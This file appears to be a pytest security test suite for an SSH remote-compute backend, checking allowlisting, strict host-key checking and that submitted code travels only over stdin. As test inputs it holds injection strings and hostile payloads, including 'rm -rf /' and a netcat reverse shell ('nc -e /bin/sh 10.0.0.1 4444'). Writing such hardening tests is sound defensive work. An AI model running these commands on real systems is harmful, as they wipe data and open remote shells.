"""A48 remote-compute security tests (Phase 4 hardening).

Level 1: fail-closed configuration parsing.
Level 2: transport integrity — user code (even malicious code) may
         only ever reach the remote end over stdin, never via argv or
         a shell; host-key verification is mandatory; destinations
         must be allowlisted.
"""
from __future__ import annotations

import os
import shlex
import stat
import subprocess
import sys
from pathlib import Path

import pytest

from forge.compute.remote import (
    MAX_OUTPUT,
    RemoteComputeBackend,
    RemoteComputeError,
    SSHConfig,
    _execute_ssh_secure,
    _ssh_argv,
    parse_ssh_config,
)

BASE_ENV = {
    "FORGE_COMPUTE_SSH_HOST": "deploy@compute.example.org",
    "FORGE_COMPUTE_SSH_USER": "deploy",
    "FORGE_COMPUTE_SSH_PORT": "",
    "FORGE_COMPUTE_SSH_ALLOWLIST": "compute.example.org,deploy@compute.example.org",  # noqa: E501
    "FORGE_COMPUTE_SSH_KNOWN_HOSTS": "/tmp/forge_known_hosts",
    "FORGE_COMPUTE_SSH_IDENTITY": "",
}


@pytest.fixture(autouse=True)
def _clean_ssh_env(monkeypatch):
    """All SSH tests start from a strict-but-valid configuration."""
    for key in list(os.environ):
        if key.startswith("FORGE_COMPUTE_SSH_") or \
                key in ("MODAL_TOKEN_ID", "MODAL_TOKEN_SECRET",
                        "FORGE_COLAB_URL"):
            monkeypatch.delenv(key, raising=False)
    for key, value in BASE_ENV.items():
        if value:
            monkeypatch.setenv(key, value)
    monkeypatch.setenv("HOME", "/tmp")


# ---------------------------------------------------------------------------
# Level 1 — configuration is fail-closed
# ---------------------------------------------------------------------------

def test_valid_config_parses() -> None:
    config = parse_ssh_config()
    assert config.user == "deploy"
    assert config.host == "compute.example.org"
    assert config.port == 22
    assert config.allowed()


def test_missing_allowlist_refuses() -> None:
    os.environ.pop("FORGE_COMPUTE_SSH_ALLOWLIST")
    with pytest.raises(RemoteComputeError, match="ALLOWLIST"):
        parse_ssh_config()


def test_host_not_in_allowlist_is_refused() -> None:
    os.environ["FORGE_COMPUTE_SSH_HOST"] = "evil.example.org"
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "compute.example.org"
    config = parse_ssh_config()  # parses structurally…
    assert config.allowed() is False  # …but is refused by the allowlist
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "evil.example.org"
    assert parse_ssh_config().allowed() is True


def test_user_required() -> None:
    os.environ["FORGE_COMPUTE_SSH_HOST"] = "compute.example.org"
    os.environ.pop("FORGE_COMPUTE_SSH_USER")
    with pytest.raises(RemoteComputeError, match="user"):
        parse_ssh_config()


def test_host_pattern_rejects_injection() -> None:
    for hostile in ("host;rm -rf /", "host$(id)", "`touch /tmp/pwned`",
                    "host|nc 10.0.0.1 4444", "-oProxyCommand=cat",
                    "a b", "user@host@x"):
        os.environ["FORGE_COMPUTE_SSH_HOST"] = hostile
        with pytest.raises(RemoteComputeError):
            parse_ssh_config()


def test_allowlist_entries_are_validated() -> None:
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "ok.example.com;$();id"
    with pytest.raises(RemoteComputeError, match="allowlist entry"):
        parse_ssh_config()


def test_argv_never_contains_user_code() -> None:
    config = parse_ssh_config()
    argv = _ssh_argv(config)
    assert argv[0] == "ssh"
    joined = shlex.join(argv)
    # The remote command is the constant, safe tail.
    assert argv[-3:] == [config.target, "python3", "-I", "-"][-3:] or \
        argv[-4:] == [config.target, "python3", "-I", "-"]
    assert "python3" in argv and "-" in argv
    # Strict host-key checking is mandatory and BatchMode disables prompts.
    assert "-o" in argv
    assert "StrictHostKeyChecking=no" not in argv
    assert "StrictHostKeyChecking=yes" in argv
    assert "BatchMode=yes" in argv
    assert "UserKnownHostsFile=/tmp/forge_known_hosts" in argv
    assert ";rm" not in joined and "$(" not in joined and "`" not in joined


@pytest.mark.parametrize("evil_code", [
    "print('hi'); __import__('os').system('rm -rf /')",
    "'; rm -rf / #",
    "$(id)",
    "`touch /tmp/pwned`",
    "import os; os.system('nc -e /bin/sh 10.0.0.1 4444')",
    "a' ; b'",
    "x\" ; y\"",
])
def test_malicious_code_never_enters_argv(evil_code: str) -> None:
    config = SSHConfig(
        user="deploy", host="compute.example.org", port=22,
        allowlist=("compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")
    argv = _ssh_argv(config)
    # The argv is built only from constants + pattern-validated config:
    # it must not contain any of the user code as a whole…
    assert evil_code not in " ".join(argv)
    # …and none of the shell metacharacters the code relies on appear in
    # any argv token (argv elements are shell-free by construction).
    assert not any(ch in token for token in argv for ch in ";$`'\""), (
        f"shell metacharacter leaked into argv: {argv}")


# ---------------------------------------------------------------------------
# Level 2 — the transport only carries code over stdin
# ---------------------------------------------------------------------------

def test_transport_delivers_code_only_over_stdin(tmp_path: Path) -> None:
    """A fake `ssh` records argv + stdin; code must arrive only on stdin."""
    record = tmp_path / "record.jsonl"
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    launcher.write_text(
        f"#!{sys.executable}\n"
        "import json, os, sys\n"
        "argv = list(sys.argv[1:])\n"
        "data = sys.stdin.buffer.read()\n"
        "with open(os.environ['FAKE_SSH_RECORD'], 'w') as fh:\n"
        "    fh.write(json.dumps({'argv': argv,\n"
        "                         'stdin': data.decode('utf-8')}))\n",
        encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)

    config = SSHConfig(
        user="deploy", host="compute.example.org", port=22,
        allowlist=("deploy@compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")

    evil_code = ("import os\n"
                 "os.system('echo pwned > /tmp/escaped') # ' ; echo hacked\n"
                 "print('ok')\n")
    env = dict(os.environ)
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"
    env["FAKE_SSH_RECORD"] = str(record)
    result = _execute_ssh_secure(evil_code, config, timeout=10.0,
                                 env=env)
    # The fake ssh exits 0, so the backend reports success.
    assert result["status"] == "succeeded"

    import json
    assert record.exists(), "fake ssh never ran"
    payload = json.loads(record.read_text(encoding="utf-8"))
    argv = payload["argv"]
    received_stdin = payload["stdin"]

    # The ssh client must have used the strict, pinned transport.
    assert "StrictHostKeyChecking=yes" in argv
    assert "BatchMode=yes" in argv
    assert argv[-4:] == ["deploy@compute.example.org", "python3", "-I", "-"]
    # The code arrives byte-for-byte on stdin — nowhere else.
    assert received_stdin == evil_code
    joined = " ".join(argv)
    assert evil_code not in joined
    assert not any(ch in token for token in argv for ch in ";$`'\""), (
        f"shell metacharacter leaked into ssh argv: {argv}")


def test_timeout_kills_whole_process_group(tmp_path: Path) -> None:
    """A hanging remote is cancelled via the process group, not leaked."""
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    # Fake ssh that ignores SIGTERM initially to force SIGKILL escalation.
    launcher.write_text(
        "#!/bin/sh\ntrap '' TERM\nsleep 60\n", encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)
    config = SSHConfig(
        user="deploy", host="compute.example.org",
        allowlist=("compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")
    env = dict(os.environ)
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"

    import time
    started = time.monotonic()
    result = _execute_ssh_secure("print('x')", config, timeout=2.0,
                                 env=env)
    assert result["status"] == "timeout"
    assert result["timed_out"] is True
    assert time.monotonic() - started < 15
    assert "timed out" in result["output"]


def test_output_is_bounded(tmp_path: Path) -> None:
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir()
    launcher = fake_bin / "ssh"
    launcher.write_text(
        "#!/bin/sh\nhead -c 100000 /dev/zero | tr '\\0' 'A'\n",
        encoding="utf-8")
    launcher.chmod(launcher.stat().st_mode | stat.S_IEXEC)
    config = SSHConfig(
        user="deploy", host="compute.example.org",
        allowlist=("compute.example.org",),
        known_hosts="/tmp/forge_known_hosts")
    env = dict(os.environ)
    env["PATH"] = f"{fake_bin}:{env.get('PATH', '')}"
    result = _execute_ssh_secure("print('x')", config, timeout=10.0,
                                 env=env)
    assert result["status"] == "succeeded"
    assert len(result["output"]) <= MAX_OUTPUT


def test_missing_known_hosts_file_fails_closed() -> None:
    """No known_hosts means host-key verification cannot pass; the call
    must fail via the strict ssh options rather than silently downgrade."""
    config = SSHConfig(
        user="deploy", host="compute.example.org",
        allowlist=("compute.example.org",),
        known_hosts="/nonexistent/known_hosts")
    argv = _ssh_argv(config)
    assert "StrictHostKeyChecking=yes" in argv
    assert any(arg == "UserKnownHostsFile=/nonexistent/known_hosts"
               for arg in argv), argv


def test_backend_refuses_when_not_allowlisted(monkeypatch) -> None:
    os.environ["FORGE_COMPUTE_SSH_ALLOWLIST"] = "other.example.org"
    backend = RemoteComputeBackend()
    assert backend.available() is False
    result = backend.execute("print(1)")
    assert result["status"] == "refused"
    assert "ALLOWLIST" in result["output"]
